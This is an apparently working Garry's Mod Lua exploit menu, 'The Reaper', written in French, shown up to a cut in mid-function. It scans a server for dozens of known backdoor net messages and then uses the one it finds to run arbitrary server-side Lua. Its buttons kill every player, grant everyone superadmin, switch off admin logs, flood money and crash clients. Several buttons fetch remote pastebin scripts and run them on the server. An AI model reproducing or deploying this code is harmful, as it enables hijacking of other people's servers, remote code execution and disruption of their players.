local reapergui = vgui.Create('DHTML');
reapergui:SetAllowLua(true);
return reapergui:ConsoleMessage([[RUNLUA:
local FAUCHEUSE = {}
FAUCHEUSE.memory = {}
local FAUX2 = FAUX2 or {}
local ulxdied = CreateClientConVar("ulxdied", 0, false, false);
local msgchat = chat.AddText
local ply = LocalPlayer()
local Reaper = nil 
local PlayerName = nil
local noir = Color ( 0,0,0,255 )
local blanc = Color ( 255,255,255,255 )
local vert = Color ( 2,200,21,100 )
local bleu = Color ( 2,18,255,255 )
local cyan = Color ( 0,119,206,255 )
local asuna = Color ( 236,111,0,255 )
local rouge = Color ( 190,0,0,255 )
local multicolore = Color (math.random(1,255),math.random(1,255),math.random(1,255))
local lil = Color ( 141,0,158,255 )
local chocolat = Color ( 111,42,0,255 )
local gris = Color ( 119,119,119,255 )
local gaymen = Color ( 240,113,196,255 )
local mer = Color ( 28,41,152,255 )
local elfamosabackdoormdr = "";
local n = net
local nr = n.Receive
local s = n.ReadString
local NBRBackdoor = 0
function Estcequecetrucmarcheoupasmec( str )
    local status, error = pcall( net.Start, str )
    return status
end
RunConsoleCommand "stopsound"
hook.Add("HUDPaint", "ACTIVATED", function() draw.SimpleTextOutlined( "THE REAPER", "menuouvert", ScrW()/2 + math.sin(RealTime()) * ScrW() / 4.700, ScrH()/1.050, HSVToColor( CurTime() % 6 * 60, 1, 1 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255)) end)
function FAUCHEUSE.ChatText( str )
function FAUCHEUSE.NetStart( str )
local netstart = net.Start
if Reaper and Reaper.G and Reaper.G.net then
netstart = Reaper.G.net.Start
else
end
return netstart( str )
end
end
function FAUCHEUSE.Estcequecetrucmarcheoupasmec( str )
local netstart = net.Start
if Reaper and Reaper.G and Reaper.G.net then
netstart = Reaper.G.net.Start
else
end
local status, error = pcall( netstart, str )
return status
end
function FAUCHEUSE.Estcequecetrucmarcheoupasmec( str )
local status, error = pcall( net.Start, str )
return status
end
function nikelesrageux(ply)
if ply:IsPlayer() then 
for k,v in pairs(ply:GetWeapons()) do
net.Start("properties")
net.WriteString( "remove" , 32 )
net.WriteEntity( v )
net.SendToServer()
            end
        end
    end
sound.PlayURL ( "http://zilnix.mtxserv.fr/Zilnix/EpicAssassin.mp3", "mono", function( station )
	if ( IsValid( station ) ) then

		station:SetPos( LocalPlayer():GetPos() )

		station:Play()
	else

		LocalPlayer():ChatPrint( "Echec Du Chargement De La Musique :/" )

	end
end )
surface.CreateFont( "Titre", {
        font = "Lato Light",
        size = 50,
        weight = 1000,
        antialias = true,
        strikeout = false,
        additive = true,
} )
surface.CreateFont( "PopupHFont", {
    font = "Segoe UI Light",
    size = 100,
    weight = 1000,
})
surface.CreateFont("PopupFont", {
    font = "Segoe UI Light",
    size = 21,
    weight = 300
})
surface.CreateFont("Erreurmdr", {
    font = "Segoe UI Light",
    size = 40,
    weight = 600
})
surface.CreateFont("Guillaume", {
    font = "Segoe UI Light",
    size = 500,
    weight = 300
})
surface.CreateFont("THEMENUOPENING78", {
font = "Segoe UI Light",
size = 47,
weight = 300
})
surface.CreateFont("jspquoimettre", {
font = "Segoe UI Light",
size = 27,
weight = 700
})
surface.CreateFont("fermermenu", {
font = "Lato Light",
size = 25,
weight = 1000
})
surface.CreateFont("menuouvert", {
font = "Lato Light",
size = 40,
weight = 1000
})
hook.Add("Think", "RAINBOWPLAYER", function()
local RainbowPlayer = HSVToColor( CurTime() % 6 * 60, 1, 1 )
    LocalPlayer():SetWeaponColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
    LocalPlayer():SetPlayerColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
end)
function Notifications(text)
    local notify = vgui.Create( "DPanel" )
    notify:SetSize( 1920, 50 )
    notify:SetPos( ScrW() - 200, -50 )
    notify.Paint = function(self, w, h)
    draw.RoundedBox( 0, 0, notify:GetTall() - 50, w, 50, HSVToColor( CurTime() % 15 * 150, 10, 10 ))
    draw.SimpleText( text, "Titre", notify:GetWide() / 2, notify:GetTall() / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end
    notify:MoveTo( ScrW() - notify:GetWide(), 0, .2, 0, -1, function()
    timer.Simple( 5, function()
    notify:MoveTo( ScrW() - notify:GetWide(), -50, .2, 0, -1)
end);end) end
surface.PlaySound("buttons/blip1.wav")
Notifications("The Reaper Activé " .. ply:GetName() .." Amuse toi bien :D")
    if( Estcequecetrucmarcheoupasmec("memeDoor") ) then
        elfamosabackdoormdr = "memeDoor"
    else
    end

    if( Estcequecetrucmarcheoupasmec("Sandbox_Armdupe") ) then 
        elfamosabackdoormdr = "Sandbox_Armdupe"
    else
    end

    if( Estcequecetrucmarcheoupasmec("DarkRP_AdminWeapons") ) then
        elfamosabackdoormdr = "DarkRP_AdminWeapons"
    else
    end

    if( Estcequecetrucmarcheoupasmec("SessionBackdoor") ) then
        elfamosabackdoormdr = "SessionBackdoor"
    else
    end

    if( Estcequecetrucmarcheoupasmec("Fix_Keypads") ) then
        elfamosabackdoormdr = "Fix_Keypads"
    else
    end

    if( Estcequecetrucmarcheoupasmec("Remove_Exploiters") ) then
        elfamosabackdoormdr = "Remove_Exploiters"
    else
    end

    if( Estcequecetrucmarcheoupasmec("noclipcloakaesp_chat_text") ) then
        elfamosabackdoormdr = "noclipcloakaesp_chat_text"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("_CAC_ReadMemory") ) then
        elfamosabackdoormdr = "_CAC_ReadMemory"
    else
    end

    if( Estcequecetrucmarcheoupasmec("nostrip") ) then
        elfamosabackdoormdr = "nostrip"
    else
    end

    if( Estcequecetrucmarcheoupasmec("LickMeOut") ) then
        elfamosabackdoormdr = "LickMeOut"
    else
    end

    if( Estcequecetrucmarcheoupasmec("MoonMan") ) then
        elfamosabackdoormdr = "MoonMan"
    else
    end

    if( Estcequecetrucmarcheoupasmec("Im_SOCool") ) then
        elfamosabackdoormdr = "Im_SOCool"
    else
    end

    if( Estcequecetrucmarcheoupasmec("ULXQUERY2") ) then
        elfamosabackdoormdr = "ULXQUERY2"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("thereaper") ) then
        elfamosabackdoormdr = "thereaper"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("noprop") ) then
        elfamosabackdoormdr = "noprop"
    else
    end

    if( Estcequecetrucmarcheoupasmec("enablevac") ) then
        elfamosabackdoormdr = "enablevac"
    else
    end

    if( Estcequecetrucmarcheoupasmec("c") ) then
        elfamosabackdoormdr = "c"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("Þà?D)◘") ) then
        elfamosabackdoormdr = "Þà?D)◘"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("disablebackdoor") ) then
        elfamosabackdoormdr = "disablebackdoor"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("kill") ) then
        elfamosabackdoormdr = "kill"
    else
    end

    if( Estcequecetrucmarcheoupasmec("dontforget") ) then
        elfamosabackdoormdr = "dontforget"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("aze46aez67z67z64dcv4bt") ) then
        elfamosabackdoormdr = "aze46aez67z67z64dcv4bt"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("changename") ) then
        elfamosabackdoormdr = "changename"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("nolag") ) then
        elfamosabackdoormdr = "nolag"
    else
    end

    if( Estcequecetrucmarcheoupasmec("music") ) then
        elfamosabackdoormdr = "music"
    else
    end

    if( Estcequecetrucmarcheoupasmec("stoppk") ) then
        elfamosabackdoormdr = "stoppk"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("_Defqon") ) then
        elfamosabackdoormdr = "_Defqon"
    else
    end

    if( Estcequecetrucmarcheoupasmec("oldNetReadData") ) then
        elfamosabackdoormdr = "oldNetReadData"
    else
    end

    if( Estcequecetrucmarcheoupasmec("ZimbaBackDoor") ) then
        elfamosabackdoormdr = "ZimbaBackDoor"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("random") ) then
        elfamosabackdoormdr = "random"
    else
    end
	
    if( Estcequecetrucmarcheoupasmec("fellosnake") ) then
        elfamosabackdoormdr = "fellosnake"
    else
    end
    if( Estcequecetrucmarcheoupasmec("Sbox_gm_attackofnullday_key") ) then
        elfamosabackdoormdr = "Sbox_gm_attackofnullday_key"
    else
    end
    if( Estcequecetrucmarcheoupasmec("DarkRP_UTF8") ) then
        elfamosabackdoormdr = "DarkRP_UTF8"
    else
    end
    if( Estcequecetrucmarcheoupasmec("ULogs_Info") ) then
        elfamosabackdoormdr = "ULogs_Info"
    else
    end
    if( Estcequecetrucmarcheoupasmec("Sbox_itemstore") ) then
        elfamosabackdoormdr = "Sbox_itemstore"
    else
    end
    if( Estcequecetrucmarcheoupasmec("Sbox_gm_attackofnullday_key") ) then
        elfamosabackdoormdr = "Sbox_gm_attackofnullday_key"
    else
    end
    if elfamosabackdoormdr == "" then
         chat.AddText(Color( 0, 0, 0 ), "[", "The Reaper", "] ", Color( 255, 0, 0 ), "Ah, aucune backdoor içi :(" )
    else
        chat.AddText(Color( 0, 0, 0 ), "[", "The Reaper", "] ", Color( 150, 0, 0 ), "Jackpot ! Il y a la backdoor ".. elfamosabackdoormdr .." sur le serveur !" )
            if GetConVarNumber("ulxdied") == 1 then
                net.Start(elfamosabackdoormdr)
                net.WriteString( "ulx logecho 0" )
                net.WriteBit (0)
                net.SendToServer()

                timer.Simple(0.1, function()
                    net.Start(elfamosabackdoormdr)
                    net.WriteString( "ulx_logecho 0" )
                    net.WriteBit (1)
                     net.SendToServer()

                chat.AddText("Logs Désactivé :D." )
                end)
            end
    end
function jefaitlenculer() 
    for k,v in pairs(player.GetAll()) do
        nikelesrageux(v)
    end
end
concommand.Add("reaper",function( )
    local LMAOCEJEUDECANCER = vgui.Create("DFrame")
        LMAOCEJEUDECANCER:SetSize(450,750)
        LMAOCEJEUDECANCER:SetTitle("Version BYPASS CAC")
        LMAOCEJEUDECANCER:MakePopup()
		LMAOCEJEUDECANCER:Center()
		LMAOCEJEUDECANCER:ShowCloseButton(false)
        LMAOCEJEUDECANCER.Paint = function()
        --Main back
        surface.SetDrawColor(0, 0, 0,200)
        surface.DrawRect(4,4,LMAOCEJEUDECANCER:GetWide()-8,LMAOCEJEUDECANCER:GetTall()-8)
		LMAOCEJEUDECANCER.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, Color(15,15,15,220))
		draw.DrawText( "The Reaper", "Titre", 120, 50, Color(175, 0, 0, 255) )
        end
			end
local jadoreetreuncancerdegmod = vgui.Create("DButton", LMAOCEJEUDECANCER)
jadoreetreuncancerdegmod:SetPos( 200, 5 )
jadoreetreuncancerdegmod:SetSize( 53, 20 )
jadoreetreuncancerdegmod:SetFont( "fermermenu" )
jadoreetreuncancerdegmod:SetText( "X" )
jadoreetreuncancerdegmod:SetTextColor( rouge )
function jadoreetreuncancerdegmod:Paint( w, h )
    draw.RoundedBox( 10, 0, 0, w, h, Color(0,0,0, 240) )
end
jadoreetreuncancerdegmod.DoClick = function()
    LMAOCEJEUDECANCER:Close()  
end 
local SOFUNNY = vgui.Create( "DPropertySheet", LMAOCEJEUDECANCER )
SOFUNNY:Dock( FILL )
SOFUNNY:DockPadding( 25, 0, 0, 0)
SOFUNNY.Paint = function (self, w, h)
for k, v in pairs(SOFUNNY.Items) do
    if (!v.Tab) then continue end
   
    v.Tab.Paint = function(self,w,h)
         draw.RoundedBox(10, 0, 0, w +0, h-1, Color(15,15,15,240))
    end
end
end
local DESTROYSERVER = vgui.Create( "DPanel", SOFUNNY )
        DESTROYSERVER.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,DESTROYSERVER:GetWide()-8,DESTROYSERVER:GetTall()-8)
		end
		DESTROYSERVER.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, Color(15,15,15,200))
    end
SOFUNNY:AddSheet( "Commandes", DESTROYSERVER, "icon16/bug.png" )
function yaunebackdooroupas()
    if( Estcequecetrucmarcheoupasmec("memeDoor") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : memeDoor" )
        elfamosabackdoormdr = "memeDoor"
    end

    if( Estcequecetrucmarcheoupasmec("JeanMichel") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : memeDoor" )
        elfamosabackdoormdr = "JeanMichel"
    end
	
    if( Estcequecetrucmarcheoupasmec("Sandbox_Armdupe") ) then 
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : Sandbox_Armdupe" )
        elfamosabackdoormdr = "Sandbox_Armdupe"
    end

    if( Estcequecetrucmarcheoupasmec("DarkRP_AdminWeapons") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : DarkRP_AdminWeapons" )
        elfamosabackdoormdr = "DarkRP_AdminWeapons"
    end
	
    if( Estcequecetrucmarcheoupasmec("SessionBackdoor") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : SessionBackdoor" )
        elfamosabackdoormdr = "SessionBackdoor"
    end

    if( Estcequecetrucmarcheoupasmec("Fix_Keypads") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : Fix_Keypads" )
        elfamosabackdoormdr = "Fix_Keypads"
    end

    if( Estcequecetrucmarcheoupasmec("Remove_Exploiters") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : Remove_Exploiters" )
        elfamosabackdoormdr = "Remove_Exploiters"
    end

    if( Estcequecetrucmarcheoupasmec("noclipcloakaesp_chat_text") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : noclipcloakaesp_chat_text" )
        elfamosabackdoormdr = "noclipcloakaesp_chat_text"
    end

    if( Estcequecetrucmarcheoupasmec("_Defqon") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : _Defqon" )
        elfamosabackdoormdr = "_Defqon"
    end

    if( Estcequecetrucmarcheoupasmec("_CAC_ReadMemory") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : _CAC_ReadMemory" )
        elfamosabackdoormdr = "_CAC_ReadMemory"
    end

    if( Estcequecetrucmarcheoupasmec("nostrip") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : nostrip" )
        elfamosabackdoormdr = "nostrip"
    end

    if( Estcequecetrucmarcheoupasmec("LickMeOut") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : LickMeOut" )
        elfamosabackdoormdr = "LickMeOut"
    end

    if( Estcequecetrucmarcheoupasmec("MoonMan") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active :MoonMan" )
        elfamosabackdoormdr = "MoonMan"
    end

    if( Estcequecetrucmarcheoupasmec("Im_SOCool") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : Im_SOCool" )
        elfamosabackdoormdr = "Im_SOCool"
    end

    if( Estcequecetrucmarcheoupasmec("ULXQUERY2") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : ULXQUERY2" )
        elfamosabackdoormdr = "ULXQUERY2"
    end
	
    if( Estcequecetrucmarcheoupasmec("jesuslebg") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : jesuslebg" )
        elfamosabackdoormdr = "jesuslebg"
    end
	
    if( Estcequecetrucmarcheoupasmec("zilnix") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : zilnix" )
        elfamosabackdoormdr = "zilnix"
    end
	
    if( Estcequecetrucmarcheoupasmec("enablevac") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : enablevac" )
        elfamosabackdoormdr = "enablevac"
    end
	
    if( Estcequecetrucmarcheoupasmec("c") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : c" )
        elfamosabackdoormdr = "c"
    end
	
    if( Estcequecetrucmarcheoupasmec("Þà?D)◘") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : Þà?D)◘" )
        elfamosabackdoormdr = "Þà?D)◘"
    end
	
    if( Estcequecetrucmarcheoupasmec("disablebackdoor") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : disablebackdoor" )
        elfamosabackdoormdr = "disablebackdoor"
    end
	
	    if( Estcequecetrucmarcheoupasmec("kill") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : kill" )
        elfamosabackdoormdr = "kill"
    end
	
	    if( Estcequecetrucmarcheoupasmec("stoppk") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : stoppk" )
        elfamosabackdoormdr = "stoppk"
    end
	
	    if( Estcequecetrucmarcheoupasmec("nolag") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : nolag" )
        elfamosabackdoormdr = "nolag"
    end
	
	    if( Estcequecetrucmarcheoupasmec("noprop") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : noprop" )
        elfamosabackdoormdr = "noprop"
    end
	
	    if( Estcequecetrucmarcheoupasmec("reaper") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : reaper" )
        elfamosabackdoormdr = "reaper"
    end
	
	    if( Estcequecetrucmarcheoupasmec("music") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : music" )
        elfamosabackdoormdr = "music"
    end
	
	    if( Estcequecetrucmarcheoupasmec("kill") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : kill" )
        elfamosabackdoormdr = "kill"
    end
	
	    if( Estcequecetrucmarcheoupasmec("kill") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : fuckyou" )
        elfamosabackdoormdr = "fuckyou"
    end
	
	    if( Estcequecetrucmarcheoupasmec("Abcdefgh") ) then
			NBRBackdoor = 1 + NBRBackdoor 
        chat.AddText( Color( 0, 0, 0 ), "[The Reaper]", Color( 127, 0, 0 )," Backdoor Active : Abcdefgh" )
        elfamosabackdoormdr = "Abcdefgh"
    end
	
    Notifications("Backdoor Selectionné : ".. elfamosabackdoormdr )
	chat.AddText(Color(0,0,0), "[", "The Reaper", "] ", Color( 255, 255, 255 ), "La Backdoor .NET est désormais : ".. elfamosabackdoormdr  )
end
local DESTROYSERVER = vgui.Create( "DScrollPanel", DESTROYSERVER )
DESTROYSERVER:Dock( FILL )
DESTROYSERVER:InnerWidth(100)
local sbar = DESTROYSERVER:GetVBar()
function DESTROYSERVER:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w -1000, h , HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnUp:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnDown:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnGrip:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
   local PetiteFaux = DESTROYSERVER:Add( "DButton")
        PetiteFaux:SetSize(375,25)
        PetiteFaux:SetPos(27,60)
		PetiteFaux:SetFont("jspquoimettre")
        PetiteFaux:SetTextColor(noir)
        PetiteFaux:SetText("Tuer Tous Le Monde")
        PetiteFaux.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux.DoClick = function ()
		Notifications("Tous le monde est mort !")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
        net.WriteBit(1)
        net.SendToServer() 
        end

		   local PetiteFaux2 = DESTROYSERVER:Add( "DButton")
        PetiteFaux2:SetSize(375,25)
        PetiteFaux2:SetPos(27,100)
		PetiteFaux2:SetFont("jspquoimettre")
        PetiteFaux2:SetTextColor(noir)
        PetiteFaux2:SetText("Mettre Tous Le Serveur Superadmin")
        PetiteFaux2.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux2.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux2.DoClick = function ()
		Notifications("Tous le monde est devenu Superadmin !")
        net.Start(elfamosabackdoormdr)
        net.WriteString("RunConsoleCommand(\"fadmin\", \"setaccess\", \"*\", \"superadmin\")")
        net.WriteBit(1)
        net.SendToServer() 
        end	
   local PetiteFaux3 = DESTROYSERVER:Add( "DButton")
        PetiteFaux3:SetSize(375,25)
        PetiteFaux3:SetPos(27,140)
		PetiteFaux3:SetFont("jspquoimettre")
        PetiteFaux3:SetTextColor(noir)
        PetiteFaux3:SetText("Activé Mode Super Asriel")
        PetiteFaux3.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux3.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux3.DoClick = function ()
		Notifications("Asriel Domine Désormais Le Serveur !")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "http.Fetch(\"https://pastebin.com/raw/eUVnvQjn\",function(b,l,h,c)RunString(b)end,nil)" )
        net.WriteBit(1)
        net.SendToServer() 
        end	
   local PetiteFaux4 = DESTROYSERVER:Add( "DButton")
        PetiteFaux4:SetSize(375,25)
        PetiteFaux4:SetPos(27,180)
		PetiteFaux4:SetFont("jspquoimettre")
        PetiteFaux4:SetTextColor(noir)
        PetiteFaux4:SetText("Détruire L'économie Du Serveur")
        PetiteFaux4.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux4.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux4.DoClick = function ()
		Notifications("L'économie vien de disparaitre :')")
        net.Start(elfamosabackdoormdr)
		net.WriteString( "for k,v in pairs(player.GetAll()) do timer.Create( \"timerargent10\", 0.1, 0, function() v:addMoney(10000000) end) end" )
        net.WriteBit(1)
        net.SendToServer() 
        end	
   local PetiteFaux5 = DESTROYSERVER:Add( "DButton")
        PetiteFaux5:SetSize(375,25)
        PetiteFaux5:SetPos(27,220)
		PetiteFaux5:SetFont("jspquoimettre")
        PetiteFaux5:SetTextColor(noir)
        PetiteFaux5:SetText("Forcer Les Joueurs A Rire")
        PetiteFaux5.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux5.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux5.DoClick = function ()
		Notifications("Les Joueurs Se Mettent A Rire")
        net.Start(elfamosabackdoormdr)
		net.WriteString("for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end timer.Create(\"rire_loop\",7.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end end )")
        net.WriteBit(1)
        net.SendToServer() 
        end
   local PetiteFaux6 = DESTROYSERVER:Add( "DButton")
        PetiteFaux6:SetSize(375,25)
        PetiteFaux6:SetPos(27,260)
		PetiteFaux6:SetFont("jspquoimettre")
        PetiteFaux6:SetTextColor(noir)
        PetiteFaux6:SetText("Activé The Reaper")
        PetiteFaux6.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux6.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux6.DoClick = function ()
		Notifications("The Reaper Is Here...")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "http.Fetch(\"https://pastebin.com/raw/3eZ2GfHD\",function(b,l,h,c)RunString(b)end,nil)" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux7 = DESTROYSERVER:Add( "DButton")
        PetiteFaux7:SetSize(375,25)
        PetiteFaux7:SetPos(27,300)
		PetiteFaux7:SetFont("jspquoimettre")
        PetiteFaux7:SetTextColor(noir)
        PetiteFaux7:SetText("Activé DROP IT")
        PetiteFaux7.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux7.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux7.DoClick = function ()
		Notifications("Drop it :c")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "http.Fetch(\"https://pastebin.com/raw/3mG900sv\",function(b,l,h,c)RunString(b)end,nil)" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux11 = DESTROYSERVER:Add( "DButton")
        PetiteFaux11:SetSize(375,25)
        PetiteFaux11:SetPos(27,420)
		PetiteFaux11:SetFont("jspquoimettre")
        PetiteFaux11:SetTextColor(noir)
        PetiteFaux11:SetText("Crash Tous Sauf Les Users")
        PetiteFaux11.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux11.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux11.DoClick = function ()
		Notifications("Tous le monde a crash a par les users :D")
        net.Start(elfamosabackdoormdr)
        net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux12 = DESTROYSERVER:Add( "DButton")
        PetiteFaux12:SetSize(375,25)
        PetiteFaux12:SetPos(27,460)
		PetiteFaux12:SetFont("jspquoimettre")
        PetiteFaux12:SetTextColor(noir)
        PetiteFaux12:SetText("Crash Tous Sauf Les Superadmins")
        PetiteFaux12.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux12.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux12.DoClick = function ()
		Notifications("Tous le monde a crash a par les superadmins :D")
